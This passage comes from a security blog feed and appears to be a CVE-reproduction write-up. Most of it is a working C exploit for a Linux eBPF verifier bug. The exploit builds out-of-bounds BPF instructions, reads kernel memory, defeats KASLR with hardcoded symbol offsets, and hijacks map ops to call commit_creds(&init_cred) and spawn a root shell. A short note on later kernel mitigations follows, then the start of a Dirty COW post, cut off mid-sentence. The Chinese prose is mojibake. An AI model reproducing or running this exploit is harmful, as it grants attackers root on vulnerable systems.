<span class="number">2</span> &lt; <span class="number">10</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d  &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">100</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> attack(map_fd, map_fd2)                                              \</span></span><br><span class="line"><span class="meta">    BPF_LD_MAP_FD(BPF_REG_1, map_fd),                                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                               \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_W, BPF_REG_2, BPF_REG_0, 0),                         \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span></span><br><span class="line"><span class="meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                                     \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),                                 \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \</span></span><br><span class="line"><span class="meta">        BPF_LD_MAP_FD(BPF_REG_1, map_fd2),                                   \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),                               \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, 0),                        \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span></span><br><span class="line"><span class="meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                                     \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),                                 \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_8, 0),                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_4, 0xffffffff),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_4, 32),                               \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_4),                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_7, 0x1),                                       \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_7, 32),                               \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 2),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 0x1),                              \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_7),                        \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_8, 0),                        \</span></span><br><span class="line"><span class="meta">        BPF_JMP32_IMM(BPF_JLE, BPF_REG_3, 1, 2),                             \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0x196082),                                  \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                                     \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_3),                        \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 0x1),                              \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 0x1),                              \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 0x1000),                           \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_7, BPF_REG_6),                                 \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_7, 0x1000 - 1),                       \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_7),                        \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> setup_btf_bpf_prog_fd;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_kernel</span><span class="params">(<span class="keyword">int</span> map_fd, <span class="keyword">int</span> map_fd2, <span class="keyword">uint64_t</span> addr, <span class="keyword">char</span> *buf, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> values[<span class="number">0x1500</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">read_map_ops_content</span>[] =</span></span><br><span class="line">        &#123;</span><br><span class="line">            attack(map_fd, map_fd2),</span><br><span class="line">            BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, <span class="number">0xD0</span>),</span><br><span class="line">            BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),</span><br><span class="line">            BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_9, <span class="number">8</span>),</span><br><span class="line">            BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">            BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">            BPF_EXIT_INSN()&#125;;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len / <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(values, <span class="number">0</span>, <span class="keyword">sizeof</span>(values));</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info_kernel</span> <span class="title">info</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">            .info.bpf_fd = map_fd,</span><br><span class="line">            .info.info = (<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;info,</span><br><span class="line">            .info.info_len = <span class="keyword">sizeof</span>(info)&#125;;</span><br><span class="line"></span><br><span class="line">        *(<span class="keyword">uint64_t</span> *)(values + <span class="number">8</span>) = addr - <span class="number">0x58</span>;</span><br><span class="line">        <span class="keyword">if</span> (addr == <span class="number">0</span>)</span><br><span class="line">            *(<span class="keyword">uint64_t</span> *)(values + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(map_fd2, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">            err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(read_map_ops_content, <span class="keyword">sizeof</span>(read_map_ops_content) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="number">1</span>, &amp;setup_btf_bpf_prog_fd))</span><br><span class="line">            err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != obj_get_info_by_fd(&amp;attr))</span><br><span class="line">            err_exit(<span class="string">&quot;[-] Failed to get map info\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        addr = addr + <span class="number">4</span>;</span><br><span class="line">        ((<span class="keyword">uint32_t</span> *)buf)[i] = info.btf_id;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">map_attr</span> =</span> &#123;</span><br><span class="line">        .map_type = BPF_MAP_TYPE_ARRAY,</span><br><span class="line">        .key_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">        .value_size = <span class="number">0x1500</span>,</span><br><span class="line">        .max_entries = <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> map_fd2 = create_map(&amp;map_attr);</span><br><span class="line">    <span class="keyword">int</span> map_fd = create_map(&amp;map_attr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (map_fd &lt; <span class="number">0</span> || map_fd2 &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, map_fd);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, map_fd2);</span><br><span class="line">        err_exit(<span class="string">&quot;Failed to create map\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *values = <span class="built_in">malloc</span>(<span class="number">0x3000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(values, <span class="number">0</span>, <span class="keyword">sizeof</span>(values));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(map_fd2, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(map_fd, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">ops</span>[] =</span></span><br><span class="line">        &#123;</span><br><span class="line">            attack(map_fd, map_fd2),</span><br><span class="line">            BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, <span class="number">0x110</span>),</span><br><span class="line">            BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),</span><br><span class="line">            BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, <span class="number">0</span>),</span><br><span class="line">            BPF_ALU64_REG(BPF_ADD, BPF_REG_8, BPF_REG_6),</span><br><span class="line">            BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">            BPF_EXIT_INSN()&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(ops, <span class="keyword">sizeof</span>(ops) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="number">2</span>, <span class="literal">NULL</span>))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != lookup_map_element(map_fd2, <span class="number">0</span>, values))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to lookup map element\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> raw_array_map_ops = <span class="number">0xffffffff820363a0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> kernel_addr;</span><br><span class="line">    <span class="keyword">uint64_t</span> kernel_base;</span><br><span class="line">    <span class="keyword">uint64_t</span> kernel_offset;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> array_map_ops = *(<span class="keyword">uint64_t</span> *)values;</span><br><span class="line">    kernel_offset = array_map_ops - raw_array_map_ops;</span><br><span class="line">    kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">uint64_t</span> work_for_cpu_fn_addr = kernel_offset + <span class="number">0xffffffff810bc190</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> commit_creds_addr = kernel_offset + <span class="number">0xffffffff810cce30</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> init_creds_addr = kernel_offset + <span class="number">0xffffffff82a6b880</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;array_map_ops_addr =&gt; %p\n&quot;</span>, array_map_ops);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_base =&gt; %p\n&quot;</span>, kernel_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_offset =&gt; %p\n&quot;</span>, kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;work_for_cpu_fn =&gt; %p\n&quot;</span>, work_for_cpu_fn_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;commit_creds_addr =&gt; %p\n&quot;</span>, commit_creds_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;init_creds_addr =&gt; %p\n&quot;</span>, init_creds_addr);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">read_map_addr_ops</span>[] =</span> &#123;</span><br><span class="line">        attack(map_fd, map_fd2),</span><br><span class="line">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, <span class="number">0x50</span>),</span><br><span class="line">        BPF_ALU64_REG(BPF_SUB, BPF_REG_9, BPF_REG_6),</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_9, <span class="number">0</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, <span class="number">8</span>),</span><br><span class="line">        BPF_EXIT_INSN()&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(read_map_addr_ops, <span class="keyword">sizeof</span>(read_map_addr_ops) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="number">1</span>, <span class="literal">NULL</span>))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != lookup_map_element(map_fd, <span class="number">0</span>, values))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to lookup map element\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> map_ptr = *(<span class="keyword">uint64_t</span> *)(values + <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;map_ptr =&gt; %p\n&quot;</span>, map_ptr);</span><br><span class="line">    <span class="keyword">uint64_t</span> map_value = map_ptr - <span class="number">0xc0</span> + <span class="number">0x110</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;map_value =&gt; %p\n&quot;</span>, map_value);</span><br><span class="line"></span><br><span class="line">    read_kernel(map_fd, map_fd2, map_ptr, values, <span class="number">0x8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, *(<span class="keyword">uint64_t</span> *)values);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(values, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    read_kernel(map_fd, map_fd2, array_map_ops, values, <span class="number">0xf0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> map_ops[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(values + <span class="number">8</span> * <span class="number">4</span>) = work_for_cpu_fn_addr;</span><br><span class="line">    <span class="built_in">memcpy</span>(map_ops, values, <span class="number">0xf0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(map_fd2, <span class="number">0</span>, map_ops, BPF_ANY))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">modify_oob_map</span>[] =</span></span><br><span class="line">        &#123;</span><br><span class="line">            attack(map_fd, map_fd2),</span><br><span class="line">            BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, <span class="number">0x110</span>),</span><br><span class="line">            BPF_ALU64_REG(BPF_SUB, BPF_REG_9, BPF_REG_6),</span><br><span class="line">            BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, <span class="number">0x8</span>),</span><br><span class="line">            BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_8, <span class="number">0x10</span>),</span><br><span class="line">            BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_8, <span class="number">0x18</span>),</span><br><span class="line">            BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_0, <span class="number">0x20</span>),</span><br><span class="line">            BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_1, <span class="number">0x28</span>),</span><br><span class="line">            BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_2, <span class="number">0</span>),</span><br><span class="line">            BPF_EXIT_INSN()&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(values, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(values + <span class="number">0x8</span>) = commit_creds_addr;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(values + <span class="number">0x10</span>) = init_creds_addr;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(values + <span class="number">0x18</span>) = map_value;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(map_fd, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(modify_oob_map, <span class="keyword">sizeof</span>(modify_oob_map) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="number">1</span>, <span class="literal">NULL</span>))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> key = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> next_key;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = map_fd2,</span><br><span class="line">        .key = &amp;key,</span><br><span class="line">        .next_key = &amp;next_key&#125;;</span><br><span class="line">    map_get_next_key(&amp;attr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] commit_cred(&amp;init_cred) done!\n&quot;</span>);</span><br><span class="line">    get_shell();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230812203539165.png"                      alt="image-20230812203539165"                ></p><h2 id="å€¼å¾—æ³¨æ„çš„"><a href="#å€¼å¾—æ³¨æ„çš„" class="headerlink" title="å€¼å¾—æ³¨æ„çš„"></a>å€¼å¾—æ³¨æ„çš„</h2><p>åœ¨linux kernel 5.11.16ç‰ˆæœ¬ä»¥åçš„ ALU sanitation æœºåˆ¶å‘ç”Ÿäº†æ”¹å˜ï¼Œä¸€æ˜¯<code>alu_limit</code>è®¡ç®—æ–¹æ³•å˜äº†ï¼Œä¸å†ç”¨æŒ‡é’ˆå¯„å­˜å™¨çš„ä½ç½®æ¥è®¡ç®—ï¼Œè€Œæ˜¯ä½¿ç”¨offsetå¯„å­˜å™¨ã€‚ä¾‹å¦‚ï¼Œå‡è®¾æœ‰ä¸ªå¯„å­˜å™¨çš„æ— ç¬¦å·è¾¹ç•Œæ˜¯ <code>umax_value = 1, umin_value = 0</code>ï¼Œåˆ™è®¡ç®—å‡º <code>alu_limit = 1</code>ï¼Œè¡¨ç¤ºå¦‚æœè¯¥å¯„å­˜å™¨åœ¨è¿è¡Œæ—¶è¶…å‡ºè¾¹ç•Œï¼Œåˆ™æŒ‡é’ˆè¿ç®—ä¸ä¼šä½¿ç”¨è¯¥å¯„å­˜å™¨ã€‚äºŒæ˜¯åœ¨runtimeæ—¶ä¼šç”¨ç«‹å³æ•°æ›¿æ¢æ‰ <code>verifier</code> è®¤å®šä¸ºå¸¸æ•°çš„å¯„å­˜å™¨ã€‚ä¾‹å¦‚ï¼Œ<code>BPF_ALU64_REG(BPF_ADD, BPF_REG_2, EXPLOIT_REG)</code> ï¼Œ<code>EXPLOIT_REG</code>è¢«verifierè®¤å®šä¸º0ï¼Œä½†è¿è¡Œæ—¶ä¸º1ï¼Œåˆ™å°†è¯¥æŒ‡ä»¤æ”¹ä¸º <code>BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, 0)</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> off_is_imm = tnum_is_const(off_reg-&gt;var_off);</span><br><span class="line">alu_state |= off_is_imm ? BPF_ALU_IMMEDIATE : <span class="number">0</span>;</span><br><span class="line">isimm = aux-&gt;alu_state &amp; BPF_ALU_IMMEDIATE;</span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"><span class="keyword">if</span> (isimm) &#123;</span><br><span class="line">        *patch++ = BPF_MOV32_IMM(BPF_REG_AX, aux-&gt;alu_limit);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="comment">// Patch alu_limit check instructions</span></span><br><span class="line">         <span class="comment">// ... ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>å‚è€ƒé“¾æ¥:</p><p>â€‹    <a class="link"   href="https://elixir.bootlin.com/linux/v5.11.16/source" >https://elixir.bootlin.com/linux/v5.11.16/source<i class="fas fa-external-link-alt"></i></a></p><p>â€‹    <a class="link"   href="https://www.anquanke.com/post/id/251933#h2-1" >https://www.anquanke.com/post/id/251933#h2-1<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;æœ€è¿‘ä¸ºäº†æ‰¾å·¥ä½œç–¯ç‹‚å¤ç°CVEæ˜¯çœŸçš„å¤ªéš¾äº†ğŸ˜­ï¼Œä»Šå¤©æ‰å‘ç°æˆ‘å·¥ä½æ—è¾¹çš„å±…ç„¶æ˜¯fmyyçˆ·ğŸ˜­ï¼Œå±äºæ˜¯ç»™è·ªäº†ã€‚&lt;/p&gt;
&lt;p&gt;è¿™æ¬¡å¤ç°çš„è¿™ä¸ªCVE</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    <category term="CVE" scheme="https://cv196082.gitee.io/categories/kernel-pwn/CVE/"/>
    
    
    <category term="ebpf" scheme="https://cv196082.gitee.io/tags/ebpf/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2016-5195</title>
    <link href="https://cv196082.gitee.io/2023/08/08/CVE-2016-5195/"/>
    <id>https://cv196082.gitee.io/2023/08/08/CVE-2016-5195/</id>
    <published>2023-08-08T02:46:43.000Z</published>
    <updated>2023-08-08T02:46:06.339Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>CVE-2016-5195å°±æ˜¯éå¸¸å‡ºåçš„<code>Dirty COW</code>ï¼Œä¿—ç§°<code>è„ç‰›æ¼æ´</code>ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡Linux Kernelä¸­çš„COW ( copy-on-write )æœºåˆ¶åˆ©ç”¨æ¡ä»¶ç«äº‰å®ç°è¶Šæƒå¯¹æ–‡ä»¶è¯»å†™ã€‚</p><p>æ­¤æ¼æ´è‡ªä»Linux Kernel 2.6.22ç‰ˆæœ¬å°±å­˜åœ¨ï¼Œç›´åˆ°2018å¹´Linux Kernel 4.8.3, 4.7.9, 4.4.26ç‰ˆæœ¬æ‰è¢«ä¿®å¤ã€‚å…¶å®è¿™ä¸€ä¸ªCVEåº”å½“æ˜¯ä¸€ä¸ªåˆå­¦è€…å¤ç°çš„ç¬¬ä¸€ä¸ªCVEçš„ï¼Œä½†æ˜¯å¯ç¬‘çš„æ˜¯æˆ‘æ˜¯çŸ¥é“ä»Šå¹´å››äº”æœˆä»½æ—¶é˜¿é‡Œå®ä¹ ç”ŸäºŒé¢çš„æ—¶å€™æ‰å¬è¯´è¿‡ï¼Œæ‰€ä»¥è¢«ç‹ ç‹ çš„åˆ·äº†ã€‚ç„¶è€Œä½œä¸ºä¸€æ¡æ‡’ç‹—æˆ‘ä¹Ÿæ˜¯ç¡¬æ‹–åˆ°ç°åœ¨æ‰è¿›è¡Œå¤ç°ï¼Œç„¶è€Œåœ¨ä¹‹å‰æˆ‘å°è¯•è¿‡å¤ç°ä¸€æ¬¡ä¸è¿‡å› ä¸ºç”µè„‘æ€§èƒ½è·‘ä¸å‡ºpocå°±æ”¾å¼ƒäº†ï¼Œå› ä¸ºæœ€è¿‘åˆè¦å¼€å§‹å„ç§é¢è¯•æ‰€ä»¥åˆè¦å¼€å§‹å­¦ä¹ å¾ˆå¤šä¸œè¥¿äº†ã€‚</p><h2 id="COWæœºåˆ¶"><a href="#COWæœºåˆ¶" class="headerlink" title="COWæœºåˆ¶"></a>COWæœºåˆ¶</h2><h3 id="basic-COW"><a href="#basic-COW" class="headerlink" title="basic COW"></a>basic COW</h3><p>COW å³ <code>copy on write</code>ï¼šç›®çš„æ˜¯ä¸ºäº†é™ä½ç³»ç»Ÿçš„å¼€é”€ï¼Œåœ¨ä¸€ä¸ªè¿›ç¨‹é€šè¿‡<code>fork()</code>åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹æ—¶ï¼Œå¹¶ä¸ä¼šç›´æ¥å°†çˆ¶è¿›ç¨‹çš„æ‰€æœ‰åœ°å€ç©ºé—´çš„æ‰€æœ‰å†…å®¹å¤åˆ¶å†åˆ†é…ç»™å­è¿›ç¨‹ã€‚è€Œå®é™…çš„æœºåˆ¶ä¸º<strong>çˆ¶è¿›ç¨‹ä¸å­è¿›ç¨‹å…±äº«æ‰€æœ‰çš„é¡µæ¡†ï¼Œè€Œä¸æ˜¯ç›´æ¥ç»™å­è¿›ç¨‹åˆ†é…æ–°çš„é¡µæ¡†ï¼Œåªæœ‰å½“å…¶ä¸­ä»»æ„ä¸€æ–¹å°è¯•å‘é¡µæ¡†å†™å…¥å†…å®¹æ—¶å†…æ ¸æ‰ä¼šä¸ºå…¶åˆ†é…é¡µæ¡†ï¼Œå¹¶å°†åŸæœ¬å†…æ¡†çš„å†…å®¹å¤åˆ¶è¿‡å»</strong>ã€‚</p><ol><li>  åœ¨<code>fork()</code>ç³»ç»Ÿè°ƒç”¨åï¼Œçˆ¶å­è¿›ç¨‹ä¼šå…±äº«æ‰€æœ‰çš„é¡µæ¡†ï¼Œå†…æ ¸å°†æ‰€æœ‰çš„é¡µæ¡†å®šä¹‰ä¸º<code>read-only</code>ã€‚</li><li>  ç”±äºæ‰€æœ‰é¡µæ¡†éƒ½æ˜¯åªè¯»çš„æƒé™ï¼Œå½“å…¶ä¸­ä»»æ„ä¸€æ–¹å°è¯•ä¿®æ”¹é¡µæ¡†æ—¶ä¾¿ä¼šè§¦å‘ç¼ºé¡µå¼‚å¸¸ï¼Œæ­¤æ—¶å†…æ 